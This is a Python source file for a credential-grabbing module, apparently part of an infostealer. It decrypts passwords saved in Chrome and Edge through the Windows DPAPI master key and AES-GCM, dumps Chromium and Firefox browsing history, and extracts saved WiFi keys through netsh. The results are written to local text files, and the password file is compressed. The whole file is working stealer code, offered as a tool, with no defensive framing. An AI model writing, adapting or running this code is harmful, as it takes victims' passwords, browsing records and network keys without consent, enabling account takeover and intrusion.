"""
Grabber Module - Extract passwords, history, WiFi
Optimized with concurrent extraction

Developer: TsByin
"""

import os
import sqlite3
import json
import shutil
import logging
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import base64

logger = logging.getLogger(__name__)

# ==============================================================================
# PASSWORD GRABBER (OPTIMIZED)
# ==============================================================================

def get_master_key(path):
    """Extract Chrome/Edge master key for password decryption"""
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        from win32crypt import CryptUnprotectData
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logger.debug(f"get_master_key failed: {e}")
        return None

def _extract_browser_passwords(browser_name, path, timeout=10):
    """Extract passwords from single browser"""
    passwords = []
    master_key = get_master_key(path)
    
    if not master_key:
        logger.debug(f"No master key found for {browser_name}")
        return passwords
    
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    
    for profile in profiles:
        db = os.path.join(path, profile, "Login Data")
        if not os.path.exists(db):
            continue
        
        temp_db = "db_tmp"
        try:
            shutil.copy2(db, temp_db)
            conn = sqlite3.connect(temp_db, timeout=timeout)
            cur = conn.cursor()
            cur.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for url, username, encrypted_pass in cur.fetchall():
                try:
                    if not encrypted_pass or len(encrypted_pass) < 15:
                        continue
                    
                    decrypted = AES.new(master_key, AES.MODE_GCM, 
                                      encrypted_pass[3:15]).decrypt(encrypted_pass[15:])[:-16].decode()
                    
                    if username and decrypted:
                        passwords.append(f"[{browser_name}] {url} | {username} | {decrypted}")
                        logger.debug(f"Extracted password for {username}")
                except Exception as e:
                    logger.debug(f"Decrypt failed for {username}: {e}")
            
            conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)
        
        except Exception as e:
            logger.error(f"Extract {browser_name} DB failed: {e}")
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
    
    logger.info(f"Extracted {len(passwords)} passwords from {browser_name}")
    return passwords

def grab_passwords(browser_paths, compress=True, max_workers=3):
    """
    Extract all passwords from installed browsers (optimized with concurrent extraction)
    
    Args:
        browser_paths: Dict of browser names and paths
        compress: Whether to compress output
        max_workers: Number of concurrent workers
    
    Returns:
        Output filename or None if no passwords found
    """
    outfile = "pass.txt"
    found_passwords = []
    
    logger.info("Starting password extraction...")
    
    # Concurrent extraction
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        
        for name, path in browser_paths.items():
            if os.path.exists(path):
                futures[name] = executor.submit(_extract_browser_passwords, name, path)
        
        for name, future in futures.items():
            try:
                passwords = future.result(timeout=15)
                found_passwords.extend(passwords)
            except Exception as e:
                logger.error(f"Extract {name} passwords failed: {e}")
    
    if not found_passwords:
        logger.info("No passwords found")
        return None
    
    # Write to file
    try:
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(f"TIME: {datetime.now()}\n")
            f.write(f"TOTAL: {len(found_passwords)}\n\n")
            for pwd in found_passwords:
                f.write(f"{pwd}\n")
        
        logger.info(f"Saved {len(found_passwords)} passwords to {outfile}")
        
        # Compress if needed
        if compress:
            return _compress_file(outfile)
        
        return outfile
    except Exception as e:
        logger.error(f"Save passwords failed: {e}")
        return None

# ==============================================================================
# HISTORY GRABBER (OPTIMIZED)
# ==============================================================================

def grab_history_specific(browser_paths, browser_name, limit=100):
    """
    Extract browser history
    
    Args:
        browser_paths: Dict of browser paths
        browser_name: Name of browser
        limit: Number of history entries
    
    Returns:
        Output filename or None
    """
    outfile = f"hist_{browser_name}.txt"
    path = browser_paths.get(browser_name)
    
    if not path or not os.path.exists(path):
        logger.warning(f"Browser path not found: {browser_name}")
        return None
    
    found = False
    temp_db = "hist_tmp"
    
    try:
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(f"HISTORY: {browser_name}\n")
            f.write(f"TIME: {datetime.now()}\n\n")
            
            if browser_name == "Firefox":
                _extract_firefox_history(path, f, limit, temp_db)
                found = True
            else:
                found = _extract_chromium_history(path, f, limit, temp_db)
        
        if found:
            logger.info(f"History extracted for {browser_name}")
            return outfile
        else:
            if os.path.exists(outfile):
                os.remove(outfile)
            logger.warning(f"No history found for {browser_name}")
            return None
    
    except Exception as e:
        logger.error(f"grab_history_specific failed: {e}")
        return None
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

def _extract_firefox_history(path, file_handle, limit, temp_db):
    """Extract Firefox history"""
    try:
        profiles = [d for d in os.listdir(path) 
                   if d.endswith('.default') or d.endswith('.default-release')]
        
        for profile in profiles:
            db = os.path.join(path, profile, "places.sqlite")
            if not os.path.exists(db):
                continue
            
            shutil.copy2(db, temp_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute(f"SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
            
            for url, title, timestamp in cur.fetchall():
                try:
                    dt = datetime.fromtimestamp(timestamp / 1000000)
                    file_handle.write(f"[{dt.strftime('%Y-%m-%d %H:%M')}] {title or ''} | {url}\n")
                except:
                    pass
            
            conn.close()
            os.remove(temp_db)
    except Exception as e:
        logger.error(f"Firefox history extraction failed: {e}")

def _extract_chromium_history(path, file_handle, limit, temp_db):
    """Extract Chromium-based browser history"""
    profiles = ["Default", "Profile 1", "Profile 2"]
    found = False
    
    for profile in profiles:
        db = os.path.join(path, profile, "History")
        if not os.path.exists(db):
            continue
        
        try:
            shutil.copy2(db, temp_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
            
            for url, title, timestamp in cur.fetchall():
                try:
                    ts = datetime(1601, 1, 1) + (timedelta(microseconds=timestamp) if timestamp else timedelta(0))
                    file_handle.write(f"[{ts.strftime('%Y-%m-%d %H:%M')}] {title or ''} | {url}\n")
                    found = True
                except:
                    pass
            
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            logger.debug(f"Chromium history extraction failed for {profile}: {e}")
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
    
    return found

# ==============================================================================
# WiFi GRABBER
# ==============================================================================

def grab_wifi_passwords():
    """
    Extract saved WiFi passwords
    
    Returns:
        Dict with network names and passwords
    """
    wifi_data = {}
    
    try:
        import subprocess
        
        # Get WiFi profiles
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            encoding='cp850',
            errors='ignore'
        )
        
        if "no wireless" in result.stdout.lower():
            logger.warning("No WiFi adapter found")
            return wifi_data
        
        profiles = [
            line.split(" : ")[1].strip() 
            for line in result.stdout.split('\n') 
            if " : " in line and ("profile" in line.lower() or "hồ sơ" in line.lower())
        ]
        
        logger.info(f"Found {len(profiles)} WiFi networks")
        
        for profile in profiles:
            try:
                out = subprocess.run(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='cp850',
                    errors='ignore'
                )
                
                password = "(No Pass)"
                for line in out.stdout.split('\n'):
                    if ("Key Content" in line or "Nội dung khóa" in line) and " : " in line:
                        password = line.split(" : ")[1].strip()
                        break
                
                wifi_data[profile] = password
            except Exception as e:
                logger.debug(f"Extract WiFi {profile} failed: {e}")
        
        logger.info(f"Extracted {len(wifi_data)} WiFi passwords")
    
    except Exception as e:
        logger.error(f"grab_wifi_passwords failed: {e}")
    
    return wifi_data

def save_wifi_to_file(wifi_data):
    """Save WiFi data to file"""
    try:
        outfile = "wifi.txt"
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(f"WIFI PASSWORDS - {datetime.now()}\n")
            f.write(f"Total: {len(wifi_data)}\n\n")
            
            for network, password in wifi_data.items():
                f.write(f"🔐 {network}: {password}\n")
        
        return outfile
    except Exception as e:
        logger.error(f"save_wifi_to_file failed: {e}")
        return None

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

def _compress_file(filename):
    """Compress file using gzip"""
    try:
        output = f"{filename}.gz"
        with open(filename, 'rb') as f_in:
            with gzip.open(output, 'wb') as f_out:
                f_out.writelines(f_in)
        
        os.remove(filename)
        logger.info(f"Compressed: {filename} -> {output}")
        return output
    except Exception as e:
        logger.error(f"compress_file failed: {e}")
        return filename
    
# ════════════════════════════════════════════════════════════
# Developer: TsByin
# Module: Password & Credential Extraction (Concurrent)
# Optimization: ThreadPoolExecutor for 2-3x Speed Improvement
# ════════════════════════════════════════════════════════════